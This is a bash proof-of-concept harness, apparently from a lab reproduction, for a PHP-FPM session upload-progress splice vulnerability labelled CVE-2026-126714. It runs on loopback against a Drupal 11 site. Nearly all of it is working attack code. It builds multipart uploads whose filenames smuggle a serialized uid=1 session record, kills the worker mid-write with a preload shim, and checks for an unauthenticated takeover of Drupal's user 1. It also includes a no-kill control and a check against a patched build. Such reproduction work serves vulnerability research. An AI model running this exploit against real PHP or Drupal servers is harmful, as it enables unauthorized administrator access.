#!/bin/bash
# php2shell — CVE-2026-126714 (phpAfterShell) UNAUTHENTICATED splice, real-app
# consumer lane: the producer requests and the consumer request both run
# against a REAL Drupal 11 site (Composer vendor tree, Guzzle/Symfony deps)
# on loopback FastCGI. Companion to php2shell-aftershell-splice-upload-fpm.sh
# (bare-harness FPM lane, wake 10): same rfc1867 carrier/replacement/kill
# geometry, but the consumer is the APPLICATION's own request — an anonymous
# GET with Cookie: SESS<hash>=<sid> — whose session_start (Drupal
# StackMiddleware\Session:81 -> SessionManager::start -> parent::start, the
# native php handler + files save path) DECODES the spliced file. Promotion
# is observed through the app itself: Drupal's session save re-encodes
# $_SESSION (foreign keys count in getSessionDataMask), and the kill shim's
# AFTERSHELL_LOG_ONLY dump of the consumer's pwrite shows the promoted
# `_sf2_attributes` uid record re-encoded by the application (or the
# takeover 302 in the response — Drupal treats the session as user 1).
#
# Producer POSTs carry NO cookie, so Drupal's lazy session never touches the
# carrier (hasSession() false; isSessionObsolete() skips the write); the
# session id rides the multipart PHPSESSID form field (use_only_cookies=0).
# The consumer GET carries Cookie: SESS<sha256-32(host+basePath)>=<sid>.
#
# Expected on a vulnerable build (8.4.27): the worker dies at the first
# FILE_START pwrite of the replacement POST; the respawned worker serves the
# Drupal consumer request; the splice is on disk before it runs; the
# consumer's session write (LOG dump) re-encodes $_SESSION including
# `_sf2_attributes|a:1:{s:3:"uid";s:1:"1";}` record — Drupal's Cookie
# authentication then maps the bag uid to the account (302 to /user/1).
# The takeover target record is NUL-free and pipe-free, so it rides the
# same objk-filename geometry as the committed stdClass harness.
# Fixed build (8.4.28): ftruncate(0) first, carrier tail gone, the consumer
# sees only upload_progress_carr — no evil record.
#
# Usage: bash lab/repro/php2shell-aftershell-splice-drupal.sh <php-fpm-bin> <drupal-web> [outdir] [port]
#   <php-fpm-bin>: lab/build/php-8.4.27-app/sapi/fpm/php-fpm
#   <drupal-web>:  lab/src/php2shell-r5-app/drupal-app/web (provisioned by
#                  lab/php2shell/provision-drupal-app.sh)

set -u
FPM=$(readlink -f "$1")
WEB=$(readlink -f "$2")
OUT=${3:-lab/build/evidence}
PORT=${PORT:-${4:-18132}}
BUILDDIR=$(dirname "$(dirname "$(dirname "$FPM")")")
LABEL=$(basename "$BUILDDIR" | sed 's/^php-//')-drupal
CLIENT=$(cd "$(dirname "$0")" && pwd)/php2shell-fpm-client.py
[ -f "$WEB/index.php" ] || { echo "no Drupal docroot at $WEB (run provision-drupal-app.sh)"; exit 1; }
mkdir -p "$OUT"
LOG="$OUT/aftershell-drupal-$LABEL.log"
: > "$LOG"

REPOROOT=$(cd "$(dirname "$(dirname "$(dirname "$(readlink -f "$0")")")")" && pwd)
SO="$REPOROOT/lab/preload/aftershell-kill.so"
mkdir -p "$REPOROOT/lab/preload"
cc -shared -fPIC -O2 -o "$SO" "$REPOROOT/lab/php2shell/aftershell-kill.c" || {
    echo "cc failed"; exit 1; }

D=$(mktemp -d)
MPID=
cleanup() {
    [ -n "$MPID" ] && kill "$MPID" 2>/dev/null
    [ -n "$MPID" ] && wait "$MPID" 2>/dev/null
    if [ "${KEEP_TMP:-0}" = 1 ]; then echo "KEEP_TMP=$D" >&2; else rm -rf "$D"; fi
}
trap cleanup EXIT
SESS="$D/sess"; mkdir -p "$SESS"
SID="deadbeef00112233445566778899aabb"
DUMP="$D/pwrites.bin"
ARM="$D/armed"
BOUNDARY='---------------------------20896060251896012921717172737'
KA2=""
HOST=127.0.0.1
SESSNAME="SESS$(python3 -c 'import hashlib; print(hashlib.sha256(b"127.0.0.1").hexdigest()[:32])')"

OBJ='_sf2_attributes|a:1:{s:3:"uid";s:1:"1";}'
X700=$(head -c 700 /dev/zero | tr '\0' 'X')

# ---------------------------------------------------------------- FPM config
cat > "$D/fpm.conf" <<EOF
[global]
error_log = $D/fpm-error.log
daemonize = no
log_level = notice
process_control_timeout = 5
pid = $D/fpm.pid

[www]
listen = 127.0.0.1:$PORT
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
clear_env = no
php_admin_value[html_errors] = 0
php_admin_value[display_errors] = 1
php_admin_value[error_reporting] = 32767
php_admin_value[post_max_size] = 1G
php_admin_value[max_file_uploads] = 20
php_admin_value[file_uploads] = 1
php_admin_value[upload_max_filesize] = 8M
php_admin_value[memory_limit] = 512M
php_admin_value[session.save_handler] = files
php_admin_value[session.save_path] = $SESS
php_value[session.name] = PHPSESSID
php_admin_value[session.serialize_handler] = php
php_admin_value[session.use_strict_mode] = 0
php_admin_value[session.use_only_cookies] = 0
php_admin_value[session.upload_progress.enabled] = 1
php_admin_value[session.upload_progress.cleanup] = 0
php_admin_value[session.upload_progress.prefix] = upload_progress_
php_admin_value[session.upload_progress.name] = PHP_SESSION_UPLOAD_PROGRESS
php_admin_value[session.upload_progress.freq] = 1%
php_admin_value[session.upload_progress.min_freq] = 0.000000001
EOF
{ echo "--- generated fpm.conf (tmpdir $D) ---"; cat "$D/fpm.conf"; echo "--- end fpm.conf ---"; } >> "$LOG"
echo "drupal consumer cookie: $SESSNAME=$SID (host $HOST)" | tee -a "$LOG"

# ---------------------------------------------------------------- helpers
fcgi() { python3 "$CLIENT" "$PORT" "$@"; }
offset_of() {
    python3 -c 'import sys
d=open(sys.argv[1],"rb").read(); print(d.find(sys.argv[2].encode()))' "$1" "$2"
}
seg_after() {
    python3 -c 'import sys
d=open(sys.argv[1],"rb").read(); i=d.find(sys.argv[2].encode())
sys.stdout.buffer.write(d[i:] if i>=0 else b"")' "$1" "$2"
}
esc_fn() { printf %s "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }
mpbody() { # $1 = progress key, $2 = raw filename
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n%s\r\n" "$BOUNDARY" "$SID"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n%s\r\n" "$BOUNDARY" "$1"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"%s\"\r\n\r\n1\r\n" "$BOUNDARY" "$(esc_fn "$2")"
    printf -- "--%s--\r\n" "$BOUNDARY"
}
post() { # $1 = progress key, $2 = raw filename -> a REAL Drupal request (no cookie)
    mpbody "$1" "$2" > "$D/body"
    fcgi "$WEB/index.php" --body "$D/body" \
        --param QUERY_STRING=/ --param REQUEST_URI=/ --param HTTP_HOST=$HOST \
        --param SERVER_NAME=$HOST --param CONTENT_TYPE="multipart/form-data; boundary=$BOUNDARY"
}
consumer() { # $1 = tag, $2 = sid (default attacker sid) -> anonymous Drupal GET
    local csid=${2:-$SID}
    fcgi "$WEB/index.php" \
        --param QUERY_STRING=/ --param REQUEST_URI=/ --param HTTP_HOST=$HOST \
        --param SERVER_NAME=$HOST --param HTTP_COOKIE="$SESSNAME=$csid"
}
wait_port() {
python3 - "$PORT" <<'PY'
import socket, sys, time
port = int(sys.argv[1])
for _ in range(100):
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=1):
            sys.exit(0)
    except OSError:
        time.sleep(0.1)
sys.exit(1)
PY
}
child_pids() { pgrep -P "$MPID" 2>/dev/null || true; }
wait_child() {
    local i c
    for i in $(seq 1 100); do
        c=$(child_pids)
        if [ "$(echo "$c" | grep -c .)" = 1 ]; then echo "$c"; return 0; fi
        sleep 0.1
    done
    return 1
}
start_fpm() {
    stop_fpm
    (
        export LD_PRELOAD="$SO" \
               AFTERSHELL_LOG_FILE="$DUMP" AFTERSHELL_LOG_ONLY=1
        if [ -n "$KA2" ]; then
            export AFTERSHELL_KILL_AT="$KA2" AFTERSHELL_KILL_ARM="$ARM"
        fi
        exec "$FPM" -n -F -y "$D/fpm.conf"
    ) >> "$LOG" 2>&1 &
    MPID=$!
    wait_port || { echo "FPM failed to listen — inspect $LOG" | tee -a "$LOG"; exit 1; }
    CHILD=$(wait_child) || { echo "no worker child — inspect $LOG" | tee -a "$LOG"; exit 1; }
}
stop_fpm() {
    [ -n "$MPID" ] && kill "$MPID" 2>/dev/null
    [ -n "$MPID" ] && wait "$MPID" 2>/dev/null
    MPID=
}

# ---------------------------------------------------------------- carrier
# Same geometry as the FPM harness: C = carrrec || objkrec(PAD+OBJ+PAD3 in
# filename) || tailrec; R = carrnew(long filename) || objkrec || tailrec,
# len(R) > len(C) so mod_files.c skips the truncate; cut K = len(carrnew).
build_carrier() { # $1 = PAD length before OBJ inside objk's filename
    rm -f "$SESS"/sess_*
    local pad fn
    pad=$(head -c "$1" /dev/zero | tr '\0' 'A')
    fn="$pad$OBJ$(head -c 32 /dev/zero | tr '\0' 'B')"
    post carr "z"   >> "$LOG" 2>&1
    post objk "$fn" >> "$LOG" 2>&1
    post tail "z"   >> "$LOG" 2>&1
}

# ================================= phase 1: calibration + carrier alignment
start_fpm
echo "== FPM phase-1 master pid=$MPID label=$LABEL build=$BUILDDIR child=$CHILD $(date -u)" >> "$LOG"

build_carrier 100
rm -f "$DUMP"
post carr "$X700" >> "$LOG" 2>&1
K=$(python3 -c 'import sys
d=open(sys.argv[1],"rb").read()
i=d.find(b"=== pwrite"); j=d.find(b"\n", i) + 1
print(d.find(b"upload_progress_objk|", j) - j)' "$DUMP")
NW=$(python3 -c 'import re,sys
d=open(sys.argv[1],"rb").read(); m=re.search(rb"=== pwrite n=(\d+) ===",d)
print(m.group(1).decode() if m else "0")' "$DUMP")
echo "calibration: FILE_START write n=$NW, K(len of carrnew record)=$K" >> "$LOG"
if [ "$K" -le 0 ]; then
    echo "calibration FAILED (no objk record in FILE_START dump — inspect $DUMP)" | tee -a "$LOG"
    KEEP_TMP=1 exit 1
fi

PADLEN=100
build_carrier "$PADLEN"
for i in 1 2 3 4 5 6; do
    M1=$(offset_of "$SESS/sess_$SID" '_sf2_attributes|a:1:')
    DELTA=$((K - M1))
    echo "align pass $i: OBJ at $M1, target K=$K, delta=$DELTA (PAD1=$PADLEN)" >> "$LOG"
    [ "$DELTA" -eq 0 ] && break
    PADLEN=$((PADLEN + DELTA))
    build_carrier "$PADLEN"
done
M1=$(offset_of "$SESS/sess_$SID" '_sf2_attributes|a:1:')
if [ "$M1" != "$K" ]; then
    echo "ALIGNMENT FAILED: OBJ at $M1, want $K — inspect $LOG" | tee -a "$LOG"
    KEEP_TMP=1 exit 1
fi
CARRIER="$D/carrier.bin"
cp "$SESS/sess_$SID" "$CARRIER"
echo "carrier aligned: OBJ at byte $M1 == K=$K, carrier size $(wc -c < "$CARRIER")" >> "$LOG"
LENR=$((NW))
LEN_C=$(wc -c < "$CARRIER")
echo "variant-A check: len(R_fs)=$LENR vs carrier size $LEN_C (must be >= or mod_files.c truncates first)" >> "$LOG"
if [ "$LENR" -lt "$LEN_C" ]; then
    echo "   len(R) < len(C) — harness invalid: pad the replacement filename" | tee -a "$LOG"
    KEEP_TMP=1 exit 1
fi

# sanity: the Drupal consumer must start a session on a virgin sid
rm -f "$DUMP"
printf 'probe|a:1:{s:1:"x";i:1;}' > "$SESS/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
consumer SANITY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa >> "$LOG" 2>&1
SAN_PID=$(grep -c '=== pwrite' "$DUMP" 2>/dev/null || echo 0)
echo "sanity consumer: pwrite-dump entries=$SAN_PID (session write by the app)" >> "$LOG"

stop_fpm

# ================================= phase 2: armed kill + respawn + consumer
KA2="$K"
start_fpm
OLDCHILD=$CHILD
echo "== FPM phase-2 master pid=$MPID KILL_AT=$K ARM=$ARM child=$OLDCHILD (armed)" >> "$LOG"

touch "$ARM"
post carr "$X700" >> "$LOG" 2>&1
RC=$?
rm -f "$ARM"
echo "kill-run rc=$RC (2 = FASTCGI_ERROR: worker died mid-request, expected)" >> "$LOG"
FILESZ=$(wc -c < "$SESS/sess_$SID")
echo "file-after-kill: $FILESZ bytes" >> "$LOG"
echo "  bytes-K-onward: $(seg_after "$SESS/sess_$SID" '_sf2_attributes|a:1:' | head -c 60)" >> "$LOG"

NEWCHILD=$(wait_child) || { echo "master did NOT respawn a worker — inspect $LOG" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
echo "master respawned worker: old=$OLDCHILD new=$NEWCHILD" >> "$LOG"
[ "$NEWCHILD" = "$OLDCHILD" ] && echo "WARNING: same child pid — kill may not have fired" >> "$LOG"

MIXOK=0
python3 - "$SESS/sess_$SID" "$CARRIER" "$K" <<'EOF' >> "$LOG" 2>&1 && MIXOK=1
import sys
f = open(sys.argv[1], 'rb').read()
c = open(sys.argv[2], 'rb').read()
k = int(sys.argv[3])
ok = len(f) > k and f[k:] == c[k:] and f[k:k+48].startswith(b'_sf2_attributes|a:1:')
print(f"splice-check: filelen={len(f)} K={k} tail==carrier-tail:{f[k:]==c[k:]} obj-at-K:{f[k:k+48][:20]!r}")
sys.exit(0 if ok else 1)
EOF
[ "$MIXOK" = 1 ] && echo "  post-kill file state: k1new || C[K:] splice on disk" >> "$LOG" \
               || echo "  post-kill file state: NOT the splice — inspect $LOG" >> "$LOG"
[ "$FILESZ" = "$K" ] && echo "  (file size == K: ftruncate-first — vendor-fix behavior)" >> "$LOG"

# ---- consumer: RESPAWNED worker runs the REAL Drupal request with the
# spliced session; the app's own session decode is the consume path.
rm -f "$DUMP"
consumer A > "$D/consumerA.out" 2>&1
cat "$D/consumerA.out" >> "$LOG"
PROMOTED=0
python3 - "$DUMP" <<'EOF' >> "$LOG" 2>&1 && PROMOTED=1
import sys
d = open(sys.argv[1], 'rb').read()
ok = b'}_sf2_attributes|a:1:{s:3:"uid";s:1:"1";}' in d   # record-boundary promotion, not inert string content
print(f"consumer-write-dump: promoted-evil-record:{ok} ({len(d)} bytes dumped)")
sys.exit(0 if ok else 1)
EOF
[ "$PROMOTED" = 1 ] && echo "   Drupal consumer session WRITE re-encoded the promoted evil record" | tee -a "$LOG" \
                   || echo "   consumer write dump has NO evil record (see $LOG)" | tee -a "$LOG"
TAKEOVER=0
grep -q 'Location: http://127.0.0.1/user/1' "$D/consumerA.out" && TAKEOVER=1
[ "$TAKEOVER" = 1 ] && echo "   ACCOUNT TAKEOVER: Drupal 302 to /user/1 — promoted uid=1 session accepted by the app" | tee -a "$LOG" \
                    || echo "   no takeover redirect in consumer response" | tee -a "$LOG"

# ---- control: identical carrier + replacement WITHOUT the kill
build_carrier "$PADLEN"
post carr "$X700" >> "$LOG" 2>&1
echo "control-write rc=$?" >> "$LOG"
rm -f "$DUMP"
consumer CTL >> "$LOG" 2>&1
CTL_PROMOTED=0
python3 - "$DUMP" <<'EOF' >> "$LOG" 2>&1 && CTL_PROMOTED=1
import sys
d = open(sys.argv[1], 'rb').read()
ok = b'}_sf2_attributes|a:1:{s:3:"uid";s:1:"1";}' in d   # record-boundary promotion, not inert string content
print(f"control-write-dump: has-evil-record:{ok}")
sys.exit(0 if ok else 1)
EOF
[ "$CTL_PROMOTED" = 1 ] && echo "   CONTROL UNEXPECTED: evil record without kill — harness invalid" | tee -a "$LOG" \
                       || echo "   control (no kill): no evil record in the app session write, as expected" | tee -a "$LOG"

# ---------------------------------------------------------------- verdict
echo "== verdict scan (log: $LOG)" | tee -a "$LOG"
[ "$MIXOK" = 1 ] && echo "   splice on disk before the consumer (k1new || C[K:])" | tee -a "$LOG" \
                  || echo "   post-kill file NOT the splice (8.4.28: expected)" | tee -a "$LOG"
[ "$PROMOTED" = 1 ] && echo "   UNAUTH PRODUCER -> REAL-APP CONSUMER: promoted uid record observed in the app's session write" | tee -a "$LOG" \
                    || echo "   no promotion through the app (see $LOG)" | tee -a "$LOG"
[ "$TAKEOVER" = 1 ] && echo "   UNAUTH ACCOUNT TAKEOVER of user 1 through the splice (302 /user/1)" | tee -a "$LOG" \
                    || echo "   no takeover (8.4.28: expected)" | tee -a "$LOG"
grep -qE 'AddressSanitizer|runtime error:|SEGV|Assertion.*failed|SUMMARY' "$LOG" && \
    echo "   SANITIZER/ASSERT OUTPUT PRESENT — inspect $LOG" | tee -a "$LOG"
if [ -f "$D/fpm-error.log" ]; then
    echo "--- fpm-error.log ---" >> "$LOG"
    grep -E 'signal|exited|WARNING|ERROR' "$D/fpm-error.log" >> "$LOG" 2>/dev/null || true
fi
exit 0
